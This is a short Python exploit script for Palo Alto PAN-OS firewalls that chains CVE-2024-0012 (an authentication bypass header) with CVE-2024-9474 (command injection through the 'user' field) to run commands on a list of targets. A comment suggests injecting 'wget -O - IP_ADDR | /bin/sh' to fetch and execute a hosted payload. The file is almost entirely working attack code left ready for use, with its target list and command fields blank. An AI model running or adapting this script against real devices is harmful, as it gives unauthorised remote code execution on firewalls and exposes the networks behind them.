#!/usr/bin/python3

import requests

#Exploits CVE-2024-0012 and CVE-2024-9474

#Script created by @suspiciouslow
#Created from research by watchTwr
#Research Link: https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/

#Enter Proxies Here If Needed
proxies = {}

#List of Targets to Exploit
targets = [""]

#Command to Inject
#Keep in mind this needs to be <63 characters in length
#It is suggested to host an exploit script and fetch/execute it
#Example: wget -O - IP_ADDR | /bin/sh
command_injection=""

for target in targets:

	session = requests.Session()

	headers = {

	    #CVE-2024-0012 - Auth Bypass Header
	    "X-PAN-AUTHCHECK": "off",
	    #Mimicing Firefox as the PAN does some kind of filtering if you don't have normal browser headers.
	    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	    "Accept-Language": "en-US,en;q=0.5",
	    "Accept-Encoding": "gzip, deflate, br",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Origin": "https://" + target,
	    "Referer": "https://" + target + "/php/login.php"

	}

	#CVE-2024-9474 - user variable command injection
	exploit_payload = 'user=`' + command_injection + '`&userRole=superuser&remoteHost=&vsys=vsys1'

	#Creates Session and Stages Payload
	stageone = session.post("https://" + target + "/php/utils/createRemoteAppwebSession.php/suslow.js.map", data=exploit_payload, headers=headers, proxies=proxies, verify=False)

	#Executes Payload (double execution for some reason)
	stagetwo = session.get("https://" + target + "/index.php/.js.map", headers=headers, proxies=proxies, verify=False)
